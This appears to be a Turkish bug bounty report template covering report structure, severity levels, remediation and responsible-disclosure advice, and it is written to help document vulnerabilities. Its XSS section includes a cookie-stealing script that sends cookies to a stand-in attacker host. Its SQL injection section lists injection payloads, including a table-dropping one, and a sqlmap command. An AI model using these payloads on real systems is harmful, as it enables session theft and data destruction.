# 🐛 Bug Bounty Rapor Şablonu (Bug Bounty Report Template)

```
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝   
██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗
██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝   ██║   
██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██╗   ██║   
██║  ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   
╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
```

---

## 🎯 Hızlı Şablon

```markdown
## Özet
[Güvenlik açığının tek satırlık açıklaması]

## Kritiklik Derecesi (Severity)
[Critical / High / Medium / Low] - CVSS: X.X

## Zafiyet Türü
[XSS / SQLi / IDOR / SSRF / vb.]

## Hedef URL / Uç Nokta
`https://example.com/vulnerable-endpoint`

## Yeniden Üretme Adımları (Steps to Reproduce)
1. Adım 1
2. Adım 2
3. Adım 3

## Güvenlik Etkisi (Impact)
[Saldırganın bu zafiyetle elde edebileceği sonuçlar]

## Kavram Kanıtı (Proof of Concept)
[Kod / Ekran Görüntüleri / Video]

## Çözüm Önerisi (Remediation)
[Zafiyetin nasıl düzeltileceği]
```

---

## 📝 Tam Rapor Şablonu

### Başlık Biçimi
```
[Kritiklik] [Zafiyet Türü] - [Özellik/Uç Nokta] üzerinde [Etki] oluşturuyor

Örnekler:
- [Critical] SQL Injection in Login Form allows Database Extraction
- [High] Stored XSS in Comments allows Account Takeover
- [Medium] IDOR in /api/users/{id} exposes PII of other users
```

---

## 📋 Ayrıntılı Rapor Yapısı

```markdown
# [Özellik/Uç Nokta] Üzerinde [Zafiyet Türü]

## Özet
[Özellik/uç nokta] üzerinde, saldırganın [güvenlik etkisi] gerçekleştirmesine 
olanak tanıyan bir [zafiyet türü] güvenlik açığı tespit edilmiştir. 
Bu zafiyet [kapsam/kullanıcılar] üzerinde etkiye sahiptir.

## Kritiklik Değerlendirmesi

| Metrik | Değer |
|--------|-------|
| **Kritiklik** | Critical / High / Medium / Low |
| **CVSS Puanı** | X.X |
| **CVSS Vektörü** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CWE** | CWE-XXX: [CWE Adı] |

## Zafiyet Ayrıntıları

### Etkilenen Varlık (Asset)
- **URL:** `https://example.com/path/to/endpoint`
- **Parametre:** `parameter_name`
- **HTTP Metodu:** GET / POST
- **Kimlik Doğrulama:** Gerekli / Gerekli Değil

### Güvensiz Kod / Yapılandırma
[Görünür veya geçerliyse ekleyin]

## Yeniden Üretme Adımları (Steps to Reproduce)

### Ön Koşullar
- Hesap Gereksinimi: Evet / Hayır
- Özel Yetki Düzeyi: [Açıklayınız]
- Kullanılan Tarayıcı / Araç: [Belirtiniz]

### Adım Adım İşlemler

1. **Zafiyet barındıran sayfaya/uç noktaya gidin**
   ```
   https://example.com/vulnerable-page
   ```

2. **Yükü (payload) enjekte edin**
   ```
   [Kullanılan yük buraya]
   ```

3. **Sonucu gözlemleyin**
   - [Gerçekleşen durum]

### HTTP İsteği (Request)
```http
POST /api/endpoint HTTP/1.1
Host: example.com
Content-Type: application/json
Cookie: session=abc123

{
  "parameter": "malicious_payload_here"
}
```

### HTTP Yanıtı (Response)
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "result": "vulnerable_response"
}
```

## Kavram Kanıtı (Proof of Concept)

### Kullanılan Yük (Payload)
```
[Zafiyeti tetikleyen yük]
```

### Ekran Görüntüsü Kanıtı
![Açıklama](attachment_url)

### Video PoC
[Video gösterim bağlantısı]

### Otomatik PoC Betiği (İsteğe Bağlı)
```python
import requests

url = "https://example.com/vulnerable"
payload = {"param": "malicious_input"}
response = requests.post(url, json=payload)
print(response.text)
```

## Güvenlik Etkisi Değerlendirmesi

### Teknik Etki
- **Gizlilik (Confidentiality):** [Erişilebilen veriler]
- **Bütünlük (Integrity):** [Değiştirilebilen veriler]
- **Erişilebilirlik (Availability):** [Servis kesintisi ihtimali]

### İşletme / Kurumsal Etki
- [Finansal zarar potansiyeli]
- [İtibar kaybı riski]
- [Yasal düzenleme / KVKK ihlalleri]
- [Etkilenen kullanıcı sayısı]

### Olası Saldırı Senaryosu
Bir saldırgan bu güvenlik açığını şu amaçlarla istismar edebilir:
1. [Eylem 1]
2. [Eylem 2]
3. [Eylem 3]

## Çözüm ve İyileştirme Önerileri

### Acil Eylem Planı
[Geçici önlem veya hızlı yama]

### Kalıcı Çözüm
[Kapsamlı ve kalıcı iyileştirme adımları]

### Kod Düzeltme Örneği (Python)
```python
# Öncesi (Güvensiz)
query = f"SELECT * FROM users WHERE id = {user_input}"

# Sonrası (Güvenli)
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_input,))
```

## Referanslar
- [OWASP Bağlantısı]
- [CWE Tanımı]
- [İlgili CVE Kayıtları]

## Zaman Çizelgesi (Timeline)
| Tarih | Eylem |
|-------|-------|
| YYYY-MM-DD | Güvenlik açığı tespit edildi |
| YYYY-MM-DD | Rapor platforma iletildi |
| YYYY-MM-DD | Güvenlik ekibi tarafından doğrulandı |
| YYYY-MM-DD | Yama dağıtıldı |
| YYYY-MM-DD | Ödül (bounty) tanımlandı |
```

---

## 🔥 Zafiyet Türüne Göre Şablonlar

### XSS (Cross-Site Scripting)

```markdown
## Özet
[Uç nokta] üzerinde yer alan yansıyan (reflected) / depolanan (stored) XSS zafiyeti, 
saldırganların kurbanların tarayıcılarında rastgele JavaScript kodu çalıştırmasına izin verir.

## Yük (Payload)
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

## Etki
- Oturum çerezlerinin çalınması (Session Hijacking)
- Hesap ele geçirme (Account Takeover)
- Tuş kaydedici (Keylogger) enjeksiyonu
- Oltalama ve zararlı yazılım dağıtımı

## PoC
```javascript
// Çerez yakalayıcı
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>
```
```

### SQL Enjeksiyonu (SQL Injection)

```markdown
## Özet
[Uç nokta] adresindeki [parametre] üzerinde tespit edilen SQL Enjeksiyonu, veritabanı 
içeriğinin yetkisiz şekilde dışa aktarılmasına olanak tanır.

## Yük (Payload)
```sql
' OR '1'='1'--
' UNION SELECT username,password FROM users--
1; DROP TABLE users--
```

## Kanıt
- Veritabanı Türü: MySQL 8.0
- Dışa aktarılan tablolar: users, orders, payments
- Erişilebilir kayıt sayısı: 10,000+

## SQLMap Komutu
```bash
sqlmap -u "https://example.com/page?id=1" --dbs --batch
```
```

### IDOR (Güvensiz Doğrudan Nesne Başvurusu)

```markdown
## Özet
[Uç nokta] üzerindeki IDOR zafiyeti, diğer kullanıcıların [kaynak] verilerine 
yetkisiz erişim sağlanmasına izin verir.

## Yeniden Üretme
1. Kullanıcı A olarak giriş yapın (ID: 100)
2. İsteği gönderin: `GET /api/users/100/profile`
3. Parametreyi 101 olarak değiştirin: `GET /api/users/101/profile`
4. Sonuç: Kullanıcı B'nin kişisel verileri döndürülür

## Etki
- Kişisel verilerin (PII) ifşası (ad, e-posta, adres)
- [X] sayıda kullanıcının verisi risk altında
- KVKK / GDPR gizlilik ihlali
```

---

## 📊 Kritiklik Seviyesi Rehberi

### Kritik (P1 - Critical)
```
- RCE (Uzaktan Kod Çalıştırma)
- Veri sızıntısıyla sonuçlanan SQL Enjeksiyonu
- Yönetici paneline kimlik doğrulama atlatma
- Tam hesap ele geçirme (Account Takeover)
- Ödeme veya bakiye manipülasyonu
- Tüm kullanıcıların kişisel verilerinin topluca ifşası
```

### Yüksek (P2 - High)
```
- Önemli etkiye sahip Depolanan (Stored) XSS
- Hassas verilere erişim sağlayan IDOR
- Dahili ağa yönelen SSRF zafiyetleri
- Yetki yükseltme (Privilege Escalation)
- Hassas sistem verilerinin ifşası
```

### Orta (P3 - Medium)
```
- Yansıyan (Reflected) XSS
- Hassas işlemlerde CSRF
- Bilgi ifşası zafiyetleri
- İstek sınırlaması (Rate limit) atlatma
- Oturum sabitleme (Session fixation)
```

### Düşük (P4 - Low)
```
- Self-XSS (Kullanıcının yalnızca kendine uygulayabildiği XSS)
- Hassas olmayan veri IDOR açıkları
- Eksik güvenlik başlıkları (Missing security headers)
- Ayrıntılı hata mesajları
- Kullanıcı adı numaralandırma
```

---

## ✅ Rapor Gönderim Kontrol Listesi

```markdown
## Göndermeden Önce

□ Açık ve açıklayıcı rapor başlığı
□ Doğru hesaplanmış CVSS puanı
□ Adım adım, net yeniden üretme adımları
□ Çalışan kavram kanıtı (PoC)
□ Güvenlik etkisinin net izahı
□ Ekran görüntüleri veya video kaydı
□ Çözüm ve iyileştirme önerisi
□ Hedefin kapsam (in-scope) dahilinde olduğu teyidi
□ Mükerrer (duplicate) olmadığı kontrolü
□ Hassas kişisel verilerin rapordan maskelenmesi
```

---

## 💡 İpuçları

### Yapılması Gerekenler ✅
```
✓ Açık, net ve özlü yazın
✓ Gereken tüm teknik detayları ekleyin
✓ Çalışır durumda PoC sağlayın
✓ Güvenlik etkisini gerçekçi biçimde açıklayın
✓ İyileştirme önerisi sunun
✓ Profesyonel ve saygılı bir dil kullanın
✓ Sorumlu ifşa (responsible disclosure) kurallarına uyun
```

### Kaçınılması Gerekenler ❌
```
✗ Gerçek kullanıcıların verilerine erişmeyin veya indirmeyin
✗ Canlı üretim ortamına zarar verecek testler yapmayın
✗ Belirlenen kapsamın dışına çıkmayın
✗ İzin almadan otomatik zafiyet tarayıcıları çalıştırmayın
✗ Zafiyet kapatılmadan kamuya açıklama yapmayın
✗ Ödül miktarı konusunda saldırgan bir tutum sergilemeyin
✗ Teorik veya pratik etkisi olmayan durumları raporlamayın
```

---

**Raporlamaya Dön:** [📝 Raporlama Şablonları](../../README.tr.md#📝-raporlama-şablonları-reporting-templates)
